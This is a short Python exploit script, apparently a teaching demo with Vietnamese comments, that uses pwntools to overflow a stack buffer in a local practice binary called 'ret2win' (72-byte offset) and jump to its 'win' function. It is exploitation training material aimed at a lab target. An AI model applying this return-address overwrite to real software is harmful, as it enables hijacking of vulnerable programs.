#!/usr/bin/env python3
# Demo 3.2: ret2win. Offset do bang cyclic = 72. win dung syscall (khong system)
# nen nhay thang vao duoc, khong vuong movaps.
from pwn import *

context.binary = elf = ELF('./ret2win', checksec=False)
context.log_level = 'info'

offset = 72                                   # do bang cyclic (xem transcript.txt)
io = process('./ret2win')
io.sendafter(b'gi di:\n', flat(b'A' * offset, elf.sym['win']))
print(io.recvall(timeout=2).decode(errors='replace'))
